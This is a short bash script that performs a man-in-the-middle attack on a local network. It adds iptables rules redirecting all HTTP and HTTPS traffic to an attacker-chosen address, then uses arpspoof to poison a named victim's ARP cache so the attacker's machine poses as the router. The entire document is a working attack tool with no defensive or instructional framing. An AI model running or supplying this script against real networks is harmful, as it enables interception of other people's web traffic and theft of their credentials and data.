#!/bin/bash

iptables-legacy -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $1
iptables-legacy -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $1
arpspoof -i eth0 -t $2 192.168.1.1 # victim IP then Router IP